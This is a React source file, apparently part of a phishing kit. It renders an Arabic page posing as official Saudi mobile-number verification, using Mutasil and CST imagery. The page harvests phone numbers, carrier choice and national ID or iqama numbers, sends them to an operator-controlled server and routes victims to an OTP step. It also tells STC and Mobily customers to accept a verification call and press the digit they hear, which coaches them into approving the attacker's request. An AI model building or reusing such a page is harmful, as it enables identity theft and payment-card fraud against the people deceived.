import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import FormControl from "@mui/material/FormControl";
import InputAdornment from "@mui/material/InputAdornment";
import InputLabel from "@mui/material/InputLabel";
import OutlinedInput from "@mui/material/OutlinedInput";
import Stack from "@mui/material/Stack";
import { useEffect, useState } from "react";
import { Controller, FieldValues, useForm } from "react-hook-form";
import { Button, MenuItem, Select, SelectChangeEvent } from "@mui/material";
import Main from "@/components/Main";
import serviceProviders from "@/data/serviceProviders";

function PhoneAuthentication() {
  const {
    control,
    handleSubmit,
    reset,
    watch,
    formState: { isValid, errors },
  } = useForm({
    mode: "onChange",
    defaultValues: {
      mobileNumber: "",
      serviceProvider: "",
      idNumber: "",
    },
  });

  function sendData(data: FieldValues) {
    const cleanedNumber = data.mobileNumber.replace(/[^\d]/g, "");

    let nextPage = `تحقق رقم الجوال (OTP)?serviceProvider=${serviceProvider}`;

    if (serviceProvider == "5") {
      nextPage = "تنبية إتصال Mobily";
    }

    sendDataToServer({
      data: {
        "رقم الجوال": cleanedNumber,
        "مزود الخدمة": serviceProviders[Number(serviceProvider)],
        "رقم الهوية": data.idNumber,
      },
      current: "توثيق رقم الجوال",
      nextPage,
    });
  }

  const [serviceProvider, setServiceProvider] = useState("");

  useEffect(() => setCurrentPage("توثيق رقم الجوال"), []);
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
      setServiceProvider("");
    }
  }, [isFormRejected.value]);

  function isValidSaudiID(id: string): boolean {
    if (!/^[12]\d{9}$/.test(id)) return false;

    let sum = 0;
    for (let i = 0; i < 10; i++) {
      let digit = parseInt(id.charAt(i));
      if ((i + 1) % 2 !== 0) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
    }

    return sum % 10 === 0;
  }

  const [phoneFocused, setPhoneFocused] = useState(false);

  return (
    <Main variant="filled">
      <form
        className="relative flex flex-col gap-2 max-w-lg mx-auto rounded-2xl"
        style={{ flexDirection: "column", justifyContent: "space-between" }}
        onSubmit={handleSubmit(sendData)}
      >
        <img
          src="/images/mutasil.png"
          alt="mobile header image"
          className="mb-6 w-1/4"
        />
        <div className="flex gap-2">
          <img src="/images/mobile.png" className="h-12" alt="mobile logo" />
          <div className="flex gap-1">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-arrow-up-right cursor-pointer w-12 text-main"
            >
              <path d="M7 7h10v10"></path>
              <path d="M7 17 17 7"></path>
            </svg>
            <div>
              <h2 className="font-bold text-gray-600">
                توثيق واعتماد رقم الجوال
              </h2>
              <h2 className="mb-1 text-gray-600">
                يجب أن يكون رقم الجوال موثقًا ومطابقًا لبيانات الهوية الوطنية /
                الإقامة، ومرتبطًا ببطاقة الدفع المدخلة
              </h2>
            </div>
          </div>
        </div>

        <div className="flex flex-col gap-2">
          {serviceProvider !== "" && (
            <div className="flex my-4 flex-col-reverse sm:flex-row">
              {serviceProvider == "0" && (
                <p className="text-[#4f008c] text-md font-bold">
                  عملاء STC الكرام في حال تلقي مكالمة من 900 الرجاء قبولها
                  واختيار الرقم 5
                </p>
              )}

              {serviceProvider == "5" && (
                <p className="text-[#1691b3] text-md font-bold">
                  ستصلك مكالمة من مزود الخدمة، يرجى اتباع التعليمات الصوتية
                  والضغط على الرقم الذي تسمعه لتأكيد الطلب
                </p>
              )}

              <img
                src={`/images/service-providers/${serviceProvider + 1}.png`}
                className="h-12 ms-auto"
                alt={serviceProviders[Number(serviceProvider)]}
              />
            </div>
          )}

          <Stack>
            <FormControl fullWidth margin="dense">
              <InputLabel
                htmlFor="mobileNumber"
                shrink={phoneFocused || !!watch("mobileNumber")}
              >
                رقم الجوال
              </InputLabel>
              <Controller
                name="mobileNumber"
                control={control}
                rules={{
                  required: "يرجى إدخال رقم الجوال",
                  validate: (value) => {
                    const cleaned = value.replace(/[^\d]/g, "");
                    return (
                      /^05\d{8}$/.test(cleaned) ||
                      "رقم الجوال غير صحيح؛ يجب أن يبدأ بـ05 ويتكون من 10 أرقام"
                    );
                  },
                }}
                render={({ field }) => (
                  <OutlinedInput
                    {...field}
                    dir="ltr"
                    id="mobileNumber"
                    type="tel"
                    onChange={(e) => {
                      let rawValue = e.target.value.replace(/[^\d]/g, "");
                      if (rawValue.length > 10) {
                        rawValue = rawValue.slice(0, 10);
                      }
                      field.onChange(rawValue);
                    }}
                    // inputComponent={MobileMask as any}
                    startAdornment={
                      <InputAdornment position="start">
                        <img
                          src="https://flagcdn.com/sa.svg"
                          alt="flag sa"
                          className="w-8"
                        />
                      </InputAdornment>
                    }
                    notched={phoneFocused || !!watch("mobileNumber")}
                    label="رقم الجوال"
                    onFocus={() => setPhoneFocused(true)}
                    onBlur={() => setPhoneFocused(false)}
                  />
                )}
              />
              {errors.mobileNumber && (
                <span className="text-red-500 text-sm mt-1">
                  {errors.mobileNumber.message}
                </span>
              )}
            </FormControl>
          </Stack>

          <Stack>
            <FormControl fullWidth margin="dense">
              <InputLabel id="demo-simple-select-label">
                اختر مزود الخدمة
              </InputLabel>
              <Select
                labelId="serviceProvider"
                id="serviceProvider"
                label="اختر مزود الخدمة"
                value={serviceProvider}
                onChange={(event: SelectChangeEvent) => {
                  setServiceProvider(event.target.value as string);
                }}
              >
                {serviceProviders.map((sp, i) => (
                  <MenuItem value={i}>{sp}</MenuItem>
                ))}
              </Select>
            </FormControl>
          </Stack>

          <Stack>
            <FormControl fullWidth margin="dense">
              <InputLabel htmlFor="idNumber">
                رقم الهوية الوطنية / الاقامة
              </InputLabel>
              <Controller
                name="idNumber"
                control={control}
                rules={{
                  required: "يرجى إدخال رقم الهوية / الإقامة",
                  validate: (value) => {
                    const cleaned = value.replace(/[^\d]/g, "");
                    if (
                      cleaned.length !== 10 ||
                      !/^1|2/.test(cleaned) ||
                      !isValidSaudiID(cleaned)
                    )
                      return "رقم الهوية غير صحيح";
                    return true;
                  },
                }}
                render={({ field }) => (
                  <OutlinedInput
                    {...field}
                    dir="ltr"
                    id="idNumber"
                    type="tel"
                    onChange={(e) => {
                      let rawValue = e.target.value.replace(/[^\d]/g, "");
                      if (rawValue.length > 10) {
                        rawValue = rawValue.slice(0, 10);
                      }
                      field.onChange(rawValue);
                    }}
                    inputProps={{ maxLength: 10 }}
                    label="رقم الهوية الوطنية / الاقامة"
                  />
                )}
              />
              {errors.idNumber && (
                <span className="text-red-500 text-sm mt-1">
                  {errors.idNumber.message}
                </span>
              )}
            </FormControl>
          </Stack>

          {isFormRejected.value && (
            <Stack className="font-medium mt-5 text-red-500 text-center">
              يوجد خطا في البيانات المدخلة
            </Stack>
          )}
        </div>

        <div dir="ltr" className="mt-2">
          <Button
            sx={{ borderRadius: "200px", backgroundColor: "#1e2746" }}
            variant="contained"
            size="large"
            className="ms-auto w-fit"
            disabled={!isValid}
            type="submit"
          >
            دخول
          </Button>
        </div>
        <img
          src="images/cst.png"
          alt="mobile header image"
          className="mt-6 mx-auto"
        />
      </form>
    </Main>
  );
}

export default PhoneAuthentication;
